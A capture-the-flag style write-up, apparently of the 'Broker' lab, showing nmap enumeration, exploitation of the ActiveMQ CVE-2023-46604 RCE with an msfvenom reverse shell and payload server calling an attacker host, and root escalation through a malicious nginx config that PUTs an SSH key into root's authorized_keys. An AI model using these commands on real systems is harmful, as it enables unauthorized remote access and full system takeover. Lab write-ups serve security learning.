@@ -1,0 +1,228 @@
+Broker Lab: Vulnerabilities: ActiveMQ server RCE CVE, Malicious Nginx config file, 
+
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.101.31
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp    open  http       nginx 1.18.0 (Ubuntu)
+|_http-title: Error 401 Unauthorized
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  basic realm=ActiveMQRealm
+1883/tcp  open  mqtt
+| mqtt-subscribe: 
+|   Topics and their most recent payloads: 
+|_    ActiveMQ/Advisory/Consumer/Topic/#: 
+5672/tcp  open  amqp?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     AMQP
+|     AMQP
+|     amqp:decode-error
+|_    7Connection from client using unsupported AMQP attempted
+|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
+8161/tcp  open  http       Jetty 9.4.39.v20210325
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  basic realm=ActiveMQRealm
+|_http-title: Error 401 Unauthorized
+|_http-server-header: Jetty(9.4.39.v20210325)
+43101/tcp open  tcpwrapped
+61613/tcp open  stomp      Apache ActiveMQ
+| fingerprint-strings: 
+|   HELP4STOMP: 
+|     ERROR
+|     content-type:text/plain
+|_    java.lang.Thread.run(Thread.java:750)
+61614/tcp open  http       Jetty 9.4.39.v20210325
+|_http-server-header: Jetty(9.4.39.v20210325)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn't have a title.
+61616/tcp open  apachemq   ActiveMQ OpenWire transport
+| fingerprint-strings: 
+
+
+http://10.129.101.31/ 
+
+Takes us to a sign in page. Let’s see if we can intercept request and probe around via burp suite
+GET / HTTP/1.1
+Host: 10.129.101.31
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+We send this to repeater, and we get a response:
+HTTP/1.1 401 Unauthorized
+Server: nginx/1.18.0 (Ubuntu)
+Date: Fri, 12 Jul 2024 18:18:25 GMT
+Content-Type: text/html;charset=iso-8859-1
+Content-Length: 447
+Connection: close
+WWW-Authenticate: basic realm="ActiveMQRealm"
+Cache-Control: must-revalidate,no-cache,no-store
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
+<title>Error 401 Unauthorized</title>
+</head>
+<body><h2>HTTP ERROR 401 Unauthorized</h2>
+<table>
+<tr><th>URI:</th><td>/</td></tr>
+<tr><th>STATUS:</th><td>401</td></tr>
+<tr><th>MESSAGE:</th><td>Unauthorized</td></tr>
+<tr><th>SERVLET:</th><td>-</td></tr>
+</table>
+<hr><a href="https://eclipse.org/jetty">Powered by Jetty:// 9.4.39.v20210325</a><hr/>
+
+</body>
+</html>
+
+
+Powered by Jetty:// 9.4.39.v20210325 might give us a clue on vulnerability
+
+We tried to send http request with user: admin and password: password to test, here’s the request:
+
+GET / HTTP/1.1
+Host: 10.129.101.31
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+
+Let’s move our focus towards the MQ server:
+1883/tcp  open  mqtt
+| mqtt-subscribe: 
+|   Topics and their most recent payloads: 
+|_    ActiveMQ/Advisory/Consumer/Topic/#: 
+
+61616/tcp open  apachemq   ActiveMQ OpenWire transport
+| fingerprint-strings: 
+|   NULL: 
+|     ActiveMQ
+|     TcpNoDelayEnabled
+|     SizePrefixDisabled
+|     CacheSize
+|     ProviderName 
+|     ActiveMQ
+|     StackTraceEnabled
+|     PlatformDetails 
+|     Java
+|     CacheEnabled
+|     TightEncodingEnabled
+|     MaxFrameSize
+|     MaxInactivityDuration
+|     MaxInactivityDurationInitalDelay
+|     ProviderVersion 
+|_    5.15.15
+
+
+ActiveMQ is running version 5.15.15
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46604 
+
+Initial Foothold:
+
+
+We went to msfconsole and searched for activemq exploit
+msfconsole
+search activemq
+   4  exploit/multi/misc/apache_activemq_rce_cve_2023_46604     2023-10-27       excellent  Yes    Apache ActiveMQ Unauthenticated Remote Code Execution
+
+https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ 
+
+Using the github:
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.48 LPORT=4444 -f elf -o
+test.elf
+python3 -m http.server 8001 &
+nc -lvvp 4444
+
+go run main.go -i 10.129.230.87 -p 61616 -u http://10.10.14.48:8001/poc-linux.xml
+
+Now our netcat listener has remote code execution on activemq server
+
+cat user.txt
+ca7140621057be9b9fbbe362ebcba480
+
+Privilege escalation:
+
+Let’s try sudo -l 
+
+sudo -l
+Matching Defaults entries for activemq on broker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User activemq may run the following commands on broker:
+    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
+
+/usr/sbin/nginx privilege escalation on google
+
+We can attempt to apply a malicious configuration file:
+user root;
+worker_processes 4;
+pid /tmp/nginx.pid;
+events {
+worker_connections 768;
+}
+http {
+server {
+listen 1337;
+root /;
+autoindex on;
+dav_methods PUT;
+}
+}
+
+This opens up a web server on port 1337 that allows you to write or “PUT” to the root folder, and this works because nginx has sudo permissions on activemq
+
+
+Get this over to the activemq server and do:
+
+sudo nginx -c /tmp/pwn.conf
+ss -tlpn
+
+-Now we can see 1337 open is open and listening while it is configured with the malicious nginx script
+
+Open a SSH key in root folder
+activemq@broker:/tmp$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/activemq/.ssh/id_rsa): ./root
+Enter passphrase (empty for no passphrase):
+
+
+curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"
+
+This effectively adds your public key to the list of authorized keys for the root user.
+
+Ls shows us root and root.pub
+
+Stabilize the shell:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+ssh -i root root@localhost
+
+The reason "ssh -i root root@localhost" worked is because we are using "our" root private key to validate against the root.pub key that we placed with our curl in 1337 root.  thus, giving us privilege to root
+
+Now we have root access
+
+cat root.txt
+ec2a8fdfe262dbeeb7dfdb4346125e3d
